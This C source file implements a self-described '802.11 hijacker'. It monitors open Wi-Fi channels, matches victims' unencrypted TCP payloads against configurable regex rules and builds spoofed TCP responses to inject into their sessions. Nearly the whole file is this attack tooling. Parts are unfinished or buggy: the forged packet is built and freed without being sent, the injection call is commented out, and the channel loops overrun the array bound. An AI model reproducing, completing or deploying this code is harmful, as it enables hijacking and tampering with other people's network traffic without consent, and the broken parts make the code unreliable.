#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <unistd.h>
#include <signal.h>

#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>

#include <lorcon2/lorcon.h> // For LORCON
#include <lorcon2/lorcon_ieee80211.h> // For LORCON
#include <lorcon2/lorcon_packasm.h>
#include <lorcon2/lorcon_forge.h>

#include <libnet.h>
#include <pcap.h>

#include "logger.h"
#include "matchers.h"

#define LLC_TYPE_IP 0x0008
#define HOP_DEFAULT_TIMEOUT 5

int debugged = 0;

// context for holding program state
struct ctx {
    char *interface_inj;
    char *interface_mon;

    char *interface_inj_vap;
    char *interface_mon_vap;

    u_int channels[14];
    u_int channel_fix;

    libnet_t *lnet;

    char *matchers_filename;
    char *log_filename;
    struct matcher_entry *matchers_list;
    u_int hop_time;

    //LORCON structs
    lorcon_t *context_inj;
    lorcon_t *context_mon;
};

struct resp {
    char *data;
    int datalen;
};

int dead;

void usage(char *argv[]) {
    printf("usage: %s -c <conf file> [interface options]", argv[0]);
    printf("\nInterface options:\n");
	printf("\t-i <iface> : sets the listen/inject interface\n");
    printf("\t-m <iface> : sets the monitor interface\n");
    printf("\t-j <iface> : sets the inject interface\n");
    printf("\t-c <channels> : sets the channels for hopping(or not, if fix defined)\n");
    printf("\t-f : fix channel, this will disable hopping and starts to always use first channel in list\n");
    printf("\t-t <time> : hop sleep time in sec(default = 5 sec)\n");
    printf("\t-l <file> : file describing configuration for matchers\n");
    printf("\t-d : enable debug messages\n");
    printf("\n");
    printf("Example(for single interface): %s -i wlan0 -c 1,6,11\n", argv[0]);
    printf("Example(for dual interfaces): %s -m wlan0 -j wlan1 -c 1,6,11\n", argv[0]);
    printf("Example(for single interface and channel fix): %s -i wlan0 -c 9 -f\n", argv[0]);
    printf("\n");
    exit(0);
}

void sig_handler(int sig) {

    signal(sig, SIG_IGN);

    switch(sig) {
        case SIGINT:
            dead = 1;
            (void) fprintf(stderr, "Got Ctrl+C, ending threads...\n");
            signal(SIGALRM, sig_handler);
            alarm(5);
            break;
        case SIGALRM:
            exit(0);
            break;
    }
}

void hexdump (void *addr, u_int len) {
    u_int i;
    u_char buff[17];
    u_char *pc = addr;

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0) {
                printf ("  %s\n", buff);
            }
            // Output the offset.
            printf ("  %04x ", i);
        }

        // Now the hex code for the specific character.
        printf (" %02x", pc[i]);
        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
            buff[i % 16] = '.';
        } else {
            buff[i % 16] = pc[i];
        }
        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf ("   ");
        i++;
    }
    // And print the final ASCII bit.
    printf ("  %s\n", buff);
}

/*
* Convenience function to extract the ssid name from a raw 802.11 frame
* and copy it to the ssid_name argument.  max_name_len is the length of
* the ssid_name buffer
*/
int get_ssid(const u_char *packet_data, char *ssid_name, u_short max_name_len) {

    if(packet_data[36] == 0){ // this is the SSID
        u_short ssid_len = packet_data[37];

        if(ssid_len == 0){
            ssid_name[0] = 0;
            return 0;
        }

        u_short max_len = ssid_len > max_name_len ? max_name_len - 1 : ssid_len;
        memcpy(ssid_name, &packet_data[38], max_len);
        ssid_name[max_len] = 0;

        return 0;
    }

    return -1;
}

matcher_entry *matchers_match(const char *data, int datalen, struct ctx *ctx) {
    matcher_entry *matcher;
    int ovector[30]; 

    for(matcher = ctx->matchers_list; matcher != NULL; matcher = matcher->next) {
        if(pcre_exec(matcher->match, NULL, data, datalen,  0, 0, ovector, 30) > 0) {
            logger(DBG, "Matched pattern for conf '%s'\n", matcher->name);
            if(pcre_exec(matcher->ignore, NULL, data, datalen, 0, 0, ovector, 30) > 0) {
                logger(DBG, "Matched ignore for conf '%s'\n", matcher->name);
            } else {
                return matcher;
            }
        }
    }
    return NULL;
}

struct resp *get_tcp_response(const char *data, int datalen, struct ctx *ctx) {

    matcher_entry *matcher;
    struct resp *rsp;

    if(!(matcher = matchers_match((const char *)data, datalen, ctx))) {
        logger(DBG, "No matchers found for data");
        return NULL;
    }

    rsp = malloc(sizeof(struct resp));
    memset(rsp, 0, sizeof(struct resp));

    if(matcher->response) {
        rsp->data = matcher->response;
        rsp->datalen = matcher->response_len;
    } else if(matcher->pyfunc) {
        PyObject *args = PyTuple_New(1);
        PyTuple_SetItem(args,0,PyString_FromStringAndSize(data, datalen)); // here is data

        PyObject *value = PyObject_CallObject(matcher->pyfunc, args);
        if(value == NULL){
            logger(DBG, "Python function returns no data!");
            free(rsp);
            return NULL;
        }   
  
        rsp->data = PyString_AsString(value);
        rsp->datalen = strlen(rsp->data);
    } else {
        logger(DBG, "There is no response data!");
        free(rsp);
        return NULL;
    }

    return rsp;

}

void build_tcp_packet(struct iphdr *ip_hdr, struct tcphdr *tcp_hdr, char *data, int datalen, struct ctx *ctx) {
    
    int check;
    u_int32_t packet_len;
    u_char *lnet_packet_buf;

    // libnet wants the data in host-byte-order
    check = libnet_build_tcp(
        ntohs(tcp_hdr->dest), // source port
        ntohs(tcp_hdr->source), // dest port
        ntohl(tcp_hdr->ack_seq), // sequence number
        ntohl(tcp_hdr->seq) + ( ntohs(ip_hdr->tot_len) - ip_hdr->ihl * 4 - tcp_hdr->doff * 4 ), // ack number
        TH_PUSH | TH_ACK, // flags
        0xffff, // window size
        0, // checksum
        0, // urg ptr
        LIBNET_TCP_H + datalen, // total length of the TCP packet
        (uint8_t*)data, // response
        datalen, // response_length
        ctx->lnet, // libnet_t pointer
        0 // ptag
    );

    if(check == -1){
        printf("libnet_build_tcp returns error: %s\n", libnet_geterror(ctx->lnet));
        return;
    }

    check = libnet_build_ipv4(
        LIBNET_TCP_H + LIBNET_IPV4_H + datalen, // length
        0, // TOS bits
        1, // IPID (need to calculate)
        0, // fragmentation
        0xff, // TTL
        IPPROTO_TCP, // protocol
        0, // checksum
        ip_hdr->daddr, // source address
        ip_hdr->saddr, // dest address
        NULL, // response
        0, // response length
        ctx->lnet, // libnet_t pointer
        0 // ptag
    );

    if(check == -1){
        printf("libnet_build_ipv4 returns error: %s\n", libnet_geterror(ctx->lnet));
        return;
    }

    // cull_packet will dump the packet (with correct checksums) into a
    // buffer for us to send via the raw socket
    if(libnet_adv_cull_packet(ctx->lnet, &lnet_packet_buf, &packet_len) == -1){
        printf("libnet_adv_cull_packet returns error: %s\n", libnet_geterror(ctx->lnet));
        return;
    }
    libnet_adv_free_packet(ctx->lnet, lnet_packet_buf);

}

void process_ip_packet(const u_char *dot3, u_int dot3_len, struct ctx *ctx, lorcon_packet_t *packet) {

    struct iphdr *ip_hdr;
    struct tcphdr *tcp_hdr;
    struct udphdr *udp_hdr;
    struct icmphdr *icmp_hdr;

    u_char *tcp_data;
    int tcp_datalen;

    u_char *udp_data;
    int udp_datalen;

    struct resp *rsp;

    /* Calculate the size of the IP Header. ip_hdr->ihl contains the number of 32 bit
    words that represent the header size. Therfore to get the number of bytes
    multiple this number by 4 */

    ip_hdr = (struct iphdr *) (dot3);
    
    logger(DBG, "IP id:%d tos:0x%x version:%d iphlen:%d dglen:%d protocol:%d ttl:%d", ntohs(ip_hdr->id), ip_hdr->tos, ip_hdr->version, ip_hdr->ihl*4, ntohs(ip_hdr->tot_len), ip_hdr->protocol, ip_hdr->ttl);
    logger(DBG, "SRC: %s", inet_ntoa(*((struct in_addr *) &ip_hdr->saddr)));
    logger(DBG, "DST: %s", inet_ntoa(*((struct in_addr *) &ip_hdr->daddr)));
    
    if(ntohs(ip_hdr->tot_len) > dot3_len) {
        logger(DBG, "Ambicious len in IP header, skipping");
        return;
    }

    switch (ip_hdr-> protocol) {
        case IPPROTO_TCP:

           /* Calculate the size of the TCP Header. tcp->doff contains the number of 32 bit
            words that represent the header size. Therfore to get the number of bytes
            multiple this number by 4 */
            tcp_hdr = (struct tcphdr *) (dot3+sizeof(struct iphdr));
            tcp_datalen = ntohs(ip_hdr->tot_len) - (ip_hdr->ihl * 4) - (tcp_hdr->doff * 4);
            logger(DBG, "TCP src_port:%d dest_port:%d doff:%d datalen:%d ack:0x%x win:0x%x seq:%d", ntohs(tcp_hdr->source), ntohs(tcp_hdr->dest), tcp_hdr->doff*4, tcp_datalen, ntohs(tcp_hdr->window), ntohl(tcp_hdr->ack_seq), ntohs(tcp_hdr->seq));
               logger(DBG, "FLAGS %c%c%c%c%c%c",
               (tcp_hdr->urg ? 'U' : '*'),
               (tcp_hdr->ack ? 'A' : '*'),
               (tcp_hdr->psh ? 'P' : '*'),
               (tcp_hdr->rst ? 'R' : '*'),
               (tcp_hdr->syn ? 'S' : '*'),
               (tcp_hdr->fin ? 'F' : '*'));

            // make sure the packet isn't empty..
            if(tcp_datalen <= 0) {
                logger(DBG, "TCP datalen <= 0, ignoring it");
                break;
            } 

            tcp_data = (u_char*) tcp_hdr + tcp_hdr->doff * 4;
            if((rsp = get_tcp_response((const char *)tcp_data, tcp_datalen, ctx))) {
                printf("%s\n", rsp->data);
                build_tcp_packet(ip_hdr, tcp_hdr, rsp->data, rsp->datalen, ctx);      
                free(rsp);
            }
            break;
        case IPPROTO_UDP:
            udp_hdr = (struct udphdr *) (dot3+sizeof(struct iphdr));
            udp_datalen = ntohs(udp_hdr->len) - sizeof(struct udphdr); 
            logger(DBG, "UDP src_port:%d dst_port:%d len:%d", ntohs(udp_hdr->source), ntohs(udp_hdr->dest), udp_datalen);
            udp_data = (u_char*) udp_hdr + sizeof(struct udphdr);
            
            hexdump((u_char *) udp_data, udp_datalen);

            // do nothing
            break;

        case IPPROTO_ICMP:
            icmp_hdr = (struct icmphdr *) (dot3+sizeof(struct iphdr));
            //memcpy(&id, (u_char*)icmphdr+4, 2);
            //memcpy(&seq, (u_char*)icmphdr+6, 2);
            logger(DBG, "ICMP type:%d code:%d", icmp_hdr->type, icmp_hdr->code);
            break;
    }

}


lorcon_packet_t *build_wlan_packet(u_char *l2data, int l2datalen, lorcon_packet_t *packet) {

    lorcon_packet_t *n_pack;
    u_char mac0[6];
    u_char mac1[6];
    u_char mac2[6];
    //u_char llc[8];

    struct lorcon_dot11_extra *i_hdr;
    i_hdr = (struct lorcon_dot11_extra *) packet->extra_info;

    memcpy(&mac0, i_hdr->source_mac, 6);
    memcpy(&mac1, i_hdr->dest_mac, 6);
    memcpy(&mac2, i_hdr->bssid_mac, 6);

    n_pack = malloc(sizeof(lorcon_packet_t));
    memset(n_pack, 0, sizeof(lorcon_packet_t));
    n_pack->lcpa = lcpa_init();

    lcpf_80211headers(
            n_pack->lcpa, 
            WLAN_FC_TYPE_DATA,      // type
            WLAN_FC_SUBTYPE_DATA,   // subtype
            WLAN_FC_TODS,           // direction WLAN_FC_FROMDS(dest,bssid,src)/WLAN_FC_TODS(bssid,src,dest)
            0x00,                   // duration
            mac0, 
            mac1, 
            mac2, 
            NULL,                   // addr4 ??
            0,                      // fragment
            1234);                  // Sequence number 
    /*
    // Alias the IP type 
    if (l2data_len > 14) {
        llc[0] = 0xaa;
        llc[1] = 0xaa;
        llc[2] = 0x03;
        llc[3] = 0x00;
        llc[4] = 0x00;
        llc[5] = 0x00;
        llc[6] = l2data[12]; // here must be ip type, last two bytes
        llc[7] = l2data[13];
    }
    n_pack->lcpa = lcpa_append_copy(n_pack->lcpa, "LLC", sizeof(llc), llc);
    */

    n_pack->lcpa = lcpa_append_copy(n_pack->lcpa, "DATA", l2datalen, l2data);
    
    /*
    if (lorcon_inject(ctx->context_inj, n_pack) < 0) {
        printf("FFF\n");    
    }
    */
    // remember to free packet TODO
    return n_pack;

}

/*
* Called by lorcon_loop for every packet 
*/
void process_wlan_packet(lorcon_packet_t *packet, struct ctx *ctx) {

    struct lorcon_dot11_extra *i_hdr;
    char ssid_name[256];

    logger(DBG, "Packet, dlt: %d len: %d h_len: %d d_len: %d", packet->dlt, packet->length, packet->length_header, packet->length_data);

    if(packet->extra_type != LORCON_PACKET_EXTRA_80211 || packet->extra_info == NULL) {
        logger(WARN, "Packet has no extra, cannot be parsed");
        hexdump((u_char *) packet->packet_raw, packet->length);
        return;
    } 

    i_hdr = (struct lorcon_dot11_extra *) packet->extra_info;

    if(i_hdr->type == WLAN_FC_TYPE_DATA) { // data frames
            
            logger(DBG, "IEEE802.11 data, type:%d subtype:%d direction:%s protected:%c src_mac:[%02X:%02X:%02X:%02X:%02X:%02X] dst_mac:[%02X:%02X:%02X:%02X:%02X:%02X] bssid_mac:[%02X:%02X:%02X:%02X:%02X:%02X]", 
                    i_hdr->type, 
                    i_hdr->subtype, 
                    i_hdr->from_ds ? "from_ds -->":"to_ds <--", 
                    i_hdr->protected ? 'y':'n',
                    i_hdr->source_mac[0], i_hdr->source_mac[1], i_hdr->source_mac[2], i_hdr->source_mac[3], i_hdr->source_mac[4], i_hdr->source_mac[5],
                    i_hdr->dest_mac[0], i_hdr->dest_mac[1], i_hdr->dest_mac[2], i_hdr->dest_mac[3], i_hdr->dest_mac[4], i_hdr->dest_mac[5],
                    i_hdr->bssid_mac[0], i_hdr->bssid_mac[1], i_hdr->bssid_mac[2], i_hdr->bssid_mac[3], i_hdr->bssid_mac[4], i_hdr->bssid_mac[5]);
            
            if(i_hdr->protected) {
                logger(DBG, "\tWe are not interested in protected packets, skipping it");
                return;
            }

            if(!(i_hdr->to_ds) || i_hdr->from_ds) {
                logger(DBG, "\tPacket from DS, skipping it");
                return;
            }

            switch(i_hdr->subtype) {
                case WLAN_FC_SUBTYPE_QOSDATA:
                    if(packet->length_data == 0) {
                        logger(DBG, "\tWe are not interested in empty packets, skipping it");
                        break;
                    }

                    switch(i_hdr->llc_type) {

                        case LLC_TYPE_IP:
                            process_ip_packet(packet->packet_data, packet->length_data, ctx, packet);
                            break;
                        default:
                            logger(DBG, "\tLLC said that packet has no IP layer, skipping it");
                            break;
                    }

                    break;
                case WLAN_FC_SUBTYPE_DATA:
                    // sometimes this data is coming from DS to client.
                    break;
            }

    } else if(i_hdr->type == WLAN_FC_TYPE_MGMT) { // management frames
        switch(i_hdr->subtype) {
            case WLAN_FC_SUBTYPE_BEACON:
                get_ssid(packet->packet_header, ssid_name, sizeof(ssid_name));
                logger(DBG, "IEEE802.11 beacon frame, ssid: (%s)", ssid_name);
                break;
            case WLAN_FC_SUBTYPE_PROBEREQ:
                get_ssid(packet->packet_header, ssid_name, sizeof(ssid_name));
                logger(DBG, "IEEE802.11 probe request, ssid: (%s)", ssid_name);
                break;
            case WLAN_FC_SUBTYPE_PROBERESP:
                get_ssid(packet->packet_header, ssid_name, sizeof(ssid_name));
                logger(DBG, "IEEE802.11 probe response, ssid: (%s)", ssid_name);
                break;
        }
    } else if(i_hdr->type == WLAN_FC_TYPE_CTRL) { // control frames
        // NOTHING HERE
    }

/*
    // radiotap header check 
    if(*((uint16_t*)packet->packet_raw) != htons(0x0000)) { // check first two bytes if equal 0x0000
        printf("[-] Corrupted or unknown radiotap header\n\n");
        dumphex((unsigned char *)packet->packet_raw, packet->length);
        return;
    }

    rdp_hdr = (struct radiotap_header *)packet_data;
    printf("\tRADIOTAP len: %d\n", rdp_hdr->len);
    packet_data = packet_data + rdp_hdr->len;
    packetlen -= rdp_hdr->len;

    switch(packet_type){
        // data packet
        case IEEE80211_DATA_FRAME:
        case IEEE80211_QOS_DATA_FRAME:

            w_hdr = (struct ieee80211_hdr *) packet->packet_data;
            packet->packet_data = packet->packet_data + sizeof(struct ieee80211_hdr);
            printf("\tIEEE802.11 data type: 0x%02x, flags: %hhu %s DS\n", w_hdr->type, w_hdr->flags, w_hdr->flags & IEEE80211_FROM_DS ? "<--" : "-->");

            if(packet_type == IEEE80211_QOS_DATA_FRAME) {
                qos_hdr = (struct QoS_hdr *) packet->packet_data;
                packet->packet_data = packet->packet_data + sizeof(struct QoS_hdr);
                printf("\t\tQOS tid: %d txop: %d\n", qos_hdr->tid, qos_hdr->txop);
            }

            if(w_hdr->flags & IEEE80211_WEP_FLAG) {
                printf("[!] This is protected packet, ignoring it\n");
                break;
            }
            
            if(!(w_hdr->flags & IEEE80211_TO_DS) || w_hdr->flags & IEEE80211_FROM_DS) { // ignore packets from the AP
                printf("[!] This is packet FROM_AP or TO_AP flag is absent, ignoring it\n");
                break;
            }

            llc_hdr = (struct LLC_hdr *) packet->packet_data;
            packet->packet_data = packet->packet_data + sizeof(struct LLC_hdr);
            printf("\t\tLLC dsap: 0x%02x ssap: 0x%02x type: 0x%04x\n", llc_hdr->dsap, llc_hdr->ssap, llc_hdr->type);

            if(llc_hdr->type != LLC_TYPE_IP) { // we are interested only in IP packets
                printf("[!] This is not IP packet, ignoring it\n");
                break;
            }

            ip_hdr = (struct iphdr *) packet->packet_data;
            packet->packet_data = packet->packet_data + (ip_hdr->ihl * 4);
            printf("\tIP version: %d len: %d protocol: %d ttl: %d\n", ip_hdr->version, ntohs(ip_hdr->tot_len), ip_hdr->protocol, ip_hdr->ttl);
            printf("\t\tSRC: %s\n", inet_ntoa(*((struct in_addr *) &ip_hdr->saddr)));
            printf("\t\tDST: %s\n", inet_ntoa(*((struct in_addr *) &ip_hdr->daddr)));
            
            if(ntohs(ip_hdr->tot_len) > packet->length) { // strange
                printf("[!] Strange IP packet, ignoring it\n");
                break;
            }

            if(ip_hdr->protocol != IPPROTO_TCP) { // only support TCP for now..
                printf("[!] This is not TCP packet, ignoring it\n");
                break;
            }

            tcp_hdr = (struct tcphdr *) packet_data;
            tcp_data = (unsigned char*) tcp_hdr + tcp_hdr->doff * 4;
            tcp_datalen = ntohs(ip_hdr->tot_len) - (ip_hdr->ihl * 4) - (tcp_hdr->doff * 4);
            printf("\tTCP source: %d dest: %d hdr_len: %d datalen: %d seq: %d\n", ntohs(tcp_hdr->source), ntohs(tcp_hdr->dest), tcp_hdr->doff*4, tcp_datalen, ntohs(tcp_hdr->seq));
            
            // make sure the packet isn't empty..
            if(tcp_datalen <= 0) {
                printf("[!] TCP datalen < 0, ignoring it\n");
                break;
            }

            if(tcp_datalen <= 100) {
                memcpy(&temp, tcp_data, tcp_datalen);
                temp[100] = 0;
            } else {
                memcpy(&temp, tcp_data, 100);
                temp[100] = 0;
            }


            printf("%s\n", temp);

            break;
        case 0x80:
            get_ssid(packet->packet_data, ssid_name, sizeof(ssid_name));
            printf("\tIEEE802.11 beacon frame (%s)\n", ssid_name);
            break;
        case 0x40:
            get_ssid(packet->packet_data, ssid_name, sizeof(ssid_name));
            printf("\tIEEE802.11 probe request (%s)\n", ssid_name);
            break;
        case 0x50:
            get_ssid(packet->packet_data, ssid_name, sizeof(ssid_name));
            printf("\tIEEE802.11 probe response (%s)\n", ssid_name);
            break;
        case 0xd4:
            printf("\tIEEE802.11 acknowledgement\n");
            break;
        case 0x48:
            printf("\tIEEE802.11 null function\n");
            break;
        case 0xb0:
            printf("\tIEEE802.11 authentication\n");
            break;
        case 0xc0:
            printf("\tIEEE802.11 deauthentication\n");
            break;
        case 0x30:
            printf("\tIEEE802.11 reassociation response\n");
            break;
        case 0xc4:
            printf("\tIEEE802.11 clear to send\n");
            break;
        default:
            printf("\tUnknown type %x\n", packet_type);
    }
*/
    //printf("\n");

    lorcon_packet_free(packet);
}


void process_packet(lorcon_t *context, lorcon_packet_t *packet, u_char *user) {

    struct ctx *ctx;
    ctx = (struct ctx *) user;

    if(dead) {
        lorcon_breakloop(context);
    } else {
        process_wlan_packet(packet, ctx);
    }
    //lorcon_packet_t *n_pack;
    //n_pack = build_wlan_packet(l2data, l2data_len);
}

lorcon_t *init_lorcon_interface(const char *interface) {

	lorcon_driver_t *driver; // Needed to set up interface/context
    lorcon_t *context; // LORCON context
    u_char *mac;
    u_int r;

	// Automatically determine the driver of the interface
	
	if ((driver = lorcon_auto_driver(interface)) == NULL) {
		logger(FATAL, "Could not determine the driver for %s", interface);
		return NULL;
	} 

	// Create LORCON context for interface
    if ((context = lorcon_create(interface, driver)) == NULL) {
        logger(FATAL, "Failed to create context");
        return NULL; 
    }

	// Create inject+monitor mode interface
	if (lorcon_open_injmon(context) < 0) {
		logger(FATAL, "Could not create inject+monitor mode interface!");
		return NULL;
	} 

    r = lorcon_get_hwmac(context, &mac);
    if(r < 0 ) {
        logger(WARN, "Fail to fetch HW addr from: %s", interface);
    } else if (r == 0) {
        logger(WARN, "HW addr is not set on: %s", interface);
    }

    logger(INFO, "Interface: %s, Driver: %s, VAP: %s, HW: %02x:%02x:%02x:%02x:%02x:%02x", interface, driver->name, lorcon_get_vap(context), mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

	lorcon_free_driver_list(driver);

    return context;
}

void clear_lorcon_interface(lorcon_t *context) {
    // Close the monitor interface
	lorcon_close(context);

	// Free the monitor LORCON Context
	lorcon_free(context);	
}

void *loop_thread(void *arg) {
    struct ctx *ctx = (struct ctx *)arg;

    lorcon_loop(ctx->context_mon, 0, process_packet, (u_char*)ctx);
    logger(DBG, "Got dead! Loop thread is closing now");
    return NULL;
}

void *channel_thread(void *arg) {
    struct ctx *ctx = (struct ctx *)arg;

    u_int ch_c;

    if(ctx->channel_fix) {
        // set first in array
        logger(INFO, "Default channel set: %d", ctx->channels[0]);
        lorcon_set_channel(ctx->context_inj, ctx->channels[0]);
        lorcon_set_channel(ctx->context_mon, ctx->channels[0]); 
    } else {
        // enter loop
        while(1) {
            for(ch_c = 0; ch_c < sizeof(ctx->channels); ch_c++) {
                if(dead) {
                    logger(INFO, "Got dead! Channel thread is closing now");
                    return NULL;
                }
                if(!ctx->channels[ch_c]) break;
                logger(DBG, "Periodical channel change: %d", ctx->channels[ch_c]);
                lorcon_set_channel(ctx->context_inj, ctx->channels[ch_c]);
                lorcon_set_channel(ctx->context_mon, ctx->channels[ch_c]);
                sleep(ctx->hop_time);
            }
        }
    }

    return NULL;
}

int main(int argc, char *argv[]) {

	int c;
    pthread_t loop_tid;
    pthread_t channel_tid;
    char lnet_err[LIBNET_ERRBUF_SIZE];

    int ch_c;    
    char *ch;

    struct ctx *ctx = calloc(1, sizeof(struct ctx));

    if(ctx == NULL){
        perror("calloc");
        exit(1);
    }

    ctx->channel_fix=0;
    ctx->hop_time = HOP_DEFAULT_TIMEOUT;
    ctx->matchers_filename = MATCHERS_DEFAULT_FILENAME;
    ctx->log_filename = NULL;

	printf ("%s - Simple 802.11 hijacker\n", argv[0]);
	printf ("-----------------------------------------------------\n\n");

	// This handles all of the command line arguments
	
	while ((c = getopt(argc, argv, "i:c:j:m:ft:l:k:hd")) != EOF) {
		switch (c) {
			case 'i': 
				ctx->interface_inj = strdup(optarg);
				ctx->interface_mon = strdup(optarg);
				break;
            case 'j':
                ctx->interface_inj = strdup(optarg);
                break;
            case 'm':
                ctx->interface_mon = strdup(optarg);
                break;
			case 'c':
                ch_c = 0;
                ch = strtok(optarg, ",");
                while(ch != NULL) {
                    if(atoi(ch) >0 && atoi(ch) <= 14 && ch_c < sizeof(ctx->channels)) {;
                        ctx->channels[ch_c] = atoi(ch);
                        ch_c++;
                    }
                    ch = strtok(NULL, ",");
                }
                ctx->channels[ch_c] = 0;
				break;
            case 'f':
                ctx->channel_fix = 1;
                break;
            case 't':
                ctx->hop_time = atoi(optarg);
                break;
            case 'l':
                ctx->log_filename = strdup(optarg);
                break;
            case 'k':
                ctx->matchers_filename = strdup(optarg);
                break;
			case 'h':
				usage(argv);
				break;
            case 'd':
                debugged = 1;
                break;
			default:
				usage(argv);
				break;
			}
	}

    if (getuid() != 0) {
        (void) fprintf(stderr, "You must be ROOT to run this!\n");
        return -1;
    } 

    signal(SIGINT, sig_handler);

	if (ctx->interface_inj == NULL || ctx->interface_mon == NULL || !ctx->channels[0]) { 
		(void) fprintf(stderr, "Interfaces or channel not set (see -h for more info)\n");
		return -1;
	}

    if(ctx->hop_time <= 0) {
        (void) fprintf(stderr, "Hop timeout must be > 0 (remember, it is defined in round seconds)\n");
        return -1;
    };

    if(!(ctx->matchers_list = parse_matchers_file(ctx->matchers_filename))) {
        (void) fprintf(stderr, "Error during parsing matchers file: %s\n", ctx->matchers_filename);
        return -1;
    }

    if (!logger_init(ctx->log_filename)) {
        (void) fprintf(stderr, "Fail to open log file: %s (%s)\n", ctx->log_filename, strerror(errno));
        return -1;
    } else if(ctx->log_filename) {
        (void) fprintf(stderr, "Logging to file: %s\n", ctx->log_filename);
    }

    ctx->lnet = libnet_init(LIBNET_LINK_ADV, NULL, lnet_err);
    if(ctx->lnet == NULL){
        logger(FATAL, "Error in libnet_init: %s", lnet_err);
        return -1;
    }

    // The following is all of the standard interface, driver, and context setup
	logger(INFO, "Initializing %s interface for inject", ctx->interface_inj);
    if((ctx->context_inj = init_lorcon_interface(ctx->interface_inj)) == NULL) {
        logger(FATAL, "Fail to initialize inject interface: %s", ctx->interface_inj);
        return -1;
    }

	logger(INFO, "Initializing %s interface for monitor", ctx->interface_mon);
    if((ctx->context_mon = init_lorcon_interface(ctx->interface_mon)) == NULL) {
        logger(FATAL, "Fail to initialize monitor interface: %s", ctx->interface_mon);
        return -1;
    }

    ctx->interface_inj_vap = strdup(lorcon_get_vap(ctx->context_inj));
    ctx->interface_mon_vap = strdup(lorcon_get_vap(ctx->context_mon));

	// Set the channels we'll be monitor and inject on
    for (ch_c = 0; ch_c <= sizeof(ctx->channels); ch_c++) {
        if(!ctx->channels[ch_c]) break;
        if(ch_c == 0) {
    	    logger(INFO, "Using monitor and injection channel: %d (default if channel fix defined)", ctx->channels[ch_c]);
        } else {
    	    logger(INFO, "Using monitor and injection channel: %d", ctx->channels[ch_c]);
        }
    }

    // Create threads

    if(pthread_create(&loop_tid, NULL, loop_thread, ctx)){
        logger(FATAL, "Error in pcap pthread_create");
        return -1;
    }

    if(pthread_create(&channel_tid, NULL, channel_thread, ctx)){
        logger(FATAL, "Error in channel pthread_create");
        return -1;
    }

    // Wait for threads to join
    
    if(pthread_join(channel_tid, NULL)) {
        logger(FATAL, "Error joining channel thread");
    }

    if(pthread_join(loop_tid, NULL)) {
        logger(FATAL, "Error joining pcap thread");
    }

    logger(INFO, "We are done");
    // The following is all of the standard cleanup stuff
	clear_lorcon_interface(ctx->context_inj);	
	clear_lorcon_interface(ctx->context_mon);	
	
	return 0;
}

